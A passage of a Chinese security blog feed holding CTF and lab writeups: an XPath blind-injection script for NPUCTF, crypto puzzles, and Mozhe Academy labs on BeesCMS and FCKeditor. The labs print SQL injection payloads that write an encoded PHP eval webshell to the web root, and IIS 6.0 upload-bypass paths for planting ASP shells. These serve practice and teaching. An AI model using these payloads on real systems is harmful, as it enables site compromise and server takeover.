class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//此时执行的查询,正常返回说明节点数量正确</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&#x27; or count(/)=1 or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以依次遍历第二层。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=<span class="string">&#x27; or count(/*/*)=1 or &#x27;</span><span class="number">1</span>&amp;p=</span><br></pre></td></tr></table></figure><p><strong>获取节点名称：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断节点长度</span></span><br><span class="line">?u=<span class="string">&#x27; or string-length(name(/*[1]))=1 or &#x27;</span><span class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//截取节点名称比较字符</span></span><br><span class="line">?u=<span class="string">&#x27; or substring(name(/*[1]), 1, 1)=&#x27;</span>a<span class="string">&#x27; or &#x27;</span><span class="number">1</span>&amp;p=</span><br></pre></td></tr></table></figure><p>按照这种思路我们可以把所有节点跑出来</p><p>对于这道题，我们也可以用这种思路，先试下万能密码</p><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200426164348.png" style="zoom:67%;"><p>提示非法操作说明成功带入了，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://9c306d79-3e0b-4b84-8711-dcfe1d3dc1b4.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;-*#$@()+^?/&lt;&gt;|~&#125;&#x27;</span></span><br><span class="line">data=<span class="string">&quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span></span><br><span class="line">proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># def get_token():</span></span><br><span class="line"><span class="comment">#     ran=random.randint(1,100000000000000)</span></span><br><span class="line"><span class="comment">#     headers=&#123;</span></span><br><span class="line"><span class="comment">#         &quot;Cookie&quot;:&quot;PHPSESSID=&#123;&#125;&quot;.format(str(ran))</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#     r1=requests.get(url,headers=headers,proxies=proxies)</span></span><br><span class="line"><span class="comment">#     token=re.search(r&#x27;\&lt;input type=\&quot;hidden\&quot; id=\&quot;token\&quot; value=\&quot;(.*)\&quot; \/\&gt;&#x27;,r1.text).group(1)</span></span><br><span class="line"><span class="comment">#     return ran,token</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    flag1=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        sess=requests.session()</span><br><span class="line">        <span class="comment"># ran,token=get_token()</span></span><br><span class="line">        r1=sess.get(url,proxies=proxies)</span><br><span class="line">        token=re.search(<span class="string">r&#x27;\&lt;input type=\&quot;hidden\&quot; id=\&quot;token\&quot; value=\&quot;(.*)\&quot; \/\&gt;&#x27;</span>,r1.text).group(<span class="number">1</span>)</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/xml&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r2=sess.post(url,data=data.format(str(i),j,token),headers=headers,proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(j)</span><br><span class="line">    <span class="keyword">if</span> flag1==flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>跑出如下格式的节点</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">accounts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>&#x27; or substring(/root/accounts/user/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;<span class="name">token</span>&gt;</span>&#123;&#125;<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br></pre></td></tr></table></figure><p>跑出第一个，发现登陆上去啥都没有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=guest</span><br><span class="line">password=e10adc3949ba59abbe56e057f20f883e  MD5解密<span class="number">123456</span></span><br></pre></td></tr></table></figure><p>再跑第二个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=adm1n</span><br><span class="line">password=cf7414b5bdb2e65ee43083f4ddbc4d9f   MD5解密gtfly123</span><br></pre></td></tr></table></figure><p>接着就是php://filter读文件,过滤了php,read,base,大写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php?file=PHP:<span class="comment">//filter/rEad=convert.basE64-encode/resource=/flag</span></span><br></pre></td></tr></table></figure><p>学长出的题太顶了，膜拜！！！</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="这是什么密码"><a href="#这是什么密码" class="headerlink" title="这是什么密码"></a>这是什么密码</h3><p>题目：</p><img src="/2020/04/18/NPUCTF-writeup/flag.jpg" style="zoom: 33%;"><p>搜了搜，搜到了个日历密码</p><p>F代表周五 S1代表周六 S2代表周日 后面是第几个周*  对应字母表就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F1 W1 S22 S21 T12 S11 W1 S13</span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">12</span> <span class="number">5</span> <span class="number">14</span> <span class="number">4</span> <span class="number">1</span> <span class="number">18</span></span><br><span class="line">calendar</span><br><span class="line">flag&#123;calendar&#125;</span><br></pre></td></tr></table></figure><h3 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical_Cipher"></a>Classical_Cipher</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">压缩包密码：gsv_pvb_rh_zgyzhs</span><br><span class="line"></span><br><span class="line">对应明文：   ***_key_**_******</span><br></pre></td></tr></table></figure><p>写了个exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(<span class="string">&quot;pvb&quot;</span>,<span class="string">&quot;key&quot;</span>):</span><br><span class="line">print(ord(i)+ord(j))</span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;gsv_pvb_rh_zgyzhs&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> i!=<span class="string">&quot;_&quot;</span>:</span><br><span class="line">key=key+chr(<span class="number">219</span>-ord(i))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">key=key+<span class="string">&quot;_&quot;</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>其实这个是埃特巴什密码</p><p>解压之后，一张图，做多了就知道是猪圈变种密码和埃及象形文字，贴一下图：</p><img src="/2020/04/18/NPUCTF-writeup/flag.png" style="zoom: 67%;"><p>埃及象形文字：</p><img src="/2020/04/18/NPUCTF-writeup/pngkit_hieroglyphics-png_2131062.png" style="zoom:80%;"><p>猪圈密码：</p><img src="/2020/04/18/NPUCTF-writeup/eba2d7ca7bcb0a46d9ed92316d63f6246a60afb8.jpg" style="zoom: 67%;"><img src="/2020/04/18/NPUCTF-writeup/9c9a0a46f21fbe094691da1c6d600c338644adb8.jpg" style="zoom:67%;"><p>所以解出来就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;classicalcode&#125;</span><br></pre></td></tr></table></figure><h3 id="Mersenne-twister"><a href="#Mersenne-twister" class="headerlink" title="Mersenne_twister"></a>Mersenne_twister</h3>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> NPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者学院题目writeup</title>
      <link href="2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/"/>
      <url>2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/</url>
      
        <content type="html"><![CDATA[<p>最近360众测很火，听说好多这上面的题，抽空做做！</p><a id="more"></a><h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><h3 id="CMS漏洞"><a href="#CMS漏洞" class="headerlink" title="CMS漏洞"></a>CMS漏洞</h3><h4 id="BeesCMS系统漏洞分析溯源"><a href="#BeesCMS系统漏洞分析溯源" class="headerlink" title="BeesCMS系统漏洞分析溯源"></a>BeesCMS系统漏洞分析溯源</h4><p>御剑扫目录：</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413211443.png" style="zoom: 80%;"><p>发现后台<code>/admin/login.php</code>，此处存在sql注入</p><p>详细分析参见：<a href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p><p>此处验证码存在漏洞，即一个验证码可多次使用，我们在username处加上一个<code>&#39;</code>发现</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413211954.png" style="zoom:80%;"><p>sql语句也出来了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,admin_name,admin_password,admin_purview,is_disable <span class="keyword">from</span> bees_admin <span class="keyword">where</span> admin_name=<span class="string">&#x27;dsad&#x27;&#x27; limit 0,1</span></span><br></pre></td></tr></table></figure><p>漏洞分析可知，union, and,select被替换，可以这样绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union =&gt; uni union on</span><br><span class="line">select =&gt; selselectect</span><br><span class="line"><span class="keyword">and</span> =&gt; a <span class="keyword">and</span> nd</span><br></pre></td></tr></table></figure><p>user输入,发现成功报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27; a and nd extractvalue(1,concat(1,database()))%23</span><br></pre></td></tr></table></figure><p>试着写shell，这里有htmlspecialchars函数的过滤，16进制或者char函数绕过，url编码好像绕过不了，还有对into ,outfile的过滤，可以这样绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outfile =&gt; outoutfilefile</span><br><span class="line">into =&gt; in into</span><br></pre></td></tr></table></figure><p>最终构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; uni union on selselectect 1,2,3,4,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e  in into  outoutfilefile %27/var/www/html/moonback.php%27%23</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; uni union on selselectect null,null,null,null,CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 49, 93, 41, 59, 63, 62)  in into  outoutfilefile %27/var/www/html/mb.php%27%23</span></span><br></pre></td></tr></table></figure><p>密码为1，蚁剑连在<code>/key.txt</code>发现key</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413215317.png" style="zoom:80%;"><h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><h4 id="编辑器漏洞分析溯源-第1题"><a href="#编辑器漏洞分析溯源-第1题" class="headerlink" title="编辑器漏洞分析溯源(第1题)"></a>编辑器漏洞分析溯源(第1题)</h4><p>参考:<a href="https://www.secpulse.com/archives/116338.html">https://www.secpulse.com/archives/116338.html</a></p><p>访问靶场，提示编辑器在<code>/fckeditor/</code>目录</p><p>查看一下编辑器版本信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/fckeditor/editor/dialog/fck_about.html</span><br><span class="line">/FCKeditor/_whatsnew.html</span><br></pre></td></tr></table></figure><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413221018.png" style="zoom: 67%;"><p>测试上传点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/upload/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/uploadtest.html</span><br><span class="line"></span><br><span class="line">FCKeditor/_samples/<span class="keyword">default</span>.html</span><br><span class="line">FCKeditor/_samples/asp/sample01.asp</span><br><span class="line">FCKeditor/_samples/asp/sample02.asp</span><br><span class="line">FCKeditor/_samples/asp/sample03.asp</span><br><span class="line">FCKeditor/_samples/asp/sample04.asp</span><br><span class="line">FCKeditor/_samples/<span class="keyword">default</span>.html</span><br><span class="line">FCKeditor/editor/fckeditor.htm</span><br><span class="line">FCKeditor/editor/fckdialog.html</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.asp</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jsp</span></span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp</span><br><span class="line">fckeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspx</span><br><span class="line">fckeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/php/connector.php</span><br></pre></td></tr></table></figure><p>随便输一个不存在的路径发现是IIS的报错页面，在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html</span><br></pre></td></tr></table></figure><p>发现可以上传</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413224820.png" style="zoom:67%;"><p>在http 响应头里看到有<code>Microsoft-IIS/6.0</code>，绕过方法很多，这里不需要绕过好像</p><p><strong>1. 二次上传绕过</strong></p><p>文件名‘ . ’ 修改为‘ _ ’</p><p>FCK在上传了诸如<code>shell.asp;.jpg</code>的文件后，会自动将文件名改为<code>shell_asp;.jpg</code>。可以继续上传同名文件，文件名会变为<code>shell.asp;(1).jpg</code></p><p><strong>2. 提交shell.php+空格绕过</strong></p><p>提交<code>shell.php</code>+空格绕过</p><p>空格只支持windows系统，linux系统是不支持的，可提交<code>shell.php</code>+空格来绕过文件名限制。</p><p><strong>3. iis6.0突破文件夹限制</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;File&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z.asp</span><br><span class="line"></span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z&amp;uuid&#x3D;1244789975684</span><br><span class="line"></span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;CurrentFolder&#x3D;&#x2F;&amp;Type&#x3D;Image&amp;NewFolderName&#x3D;shell.asp</span><br></pre></td></tr></table></figure><p><strong>4. 文件解析限制</strong></p><p>通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.moonback.xyz&#x2F;images&#x2F;upload&#x2F;201806&#x2F;image&#x2F;1.asp&#x2F;1.jpg</span><br></pre></td></tr></table></figure><p>关于解析漏洞参考：<a href="https://www.secpulse.com/archives/3750.html">https://www.secpulse.com/archives/3750.html</a></p><p>最终上传类似<code>shell.asp;jpg</code>就能上传成功，成功之后会把目录文件列举出来,地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;userfiles&#x2F;file&#x2F;shell.asp;jpg</span><br></pre></td></tr></table></figure><p>蚁剑连找flag就行</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413224623.png" style="zoom:67%;"><p>如果找不到目录的话可以试试</p><p><strong>1. 根据xml返回信息查看网站目录</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.-sec.org&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;..&#x2F;..&#x2F;..&#x2F;&amp;NewFolderName&#x3D;shell.asp</span><br></pre></td></tr></table></figure><p><strong>2. 获取当前文件夹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;php&#x2F;connector.php?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br></pre></td></tr></table></figure><p><strong>3. 游览c盘</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;Curre</span><br></pre></td></tr></table></figure><p>11</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> 墨者学院 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 writeup</title>
      <link href="2020/04/11/MRCTF2020-writeup/"/>
      <url>2020/04/11/MRCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了MRCTF 2020部分题目的writeup!</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h3><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span 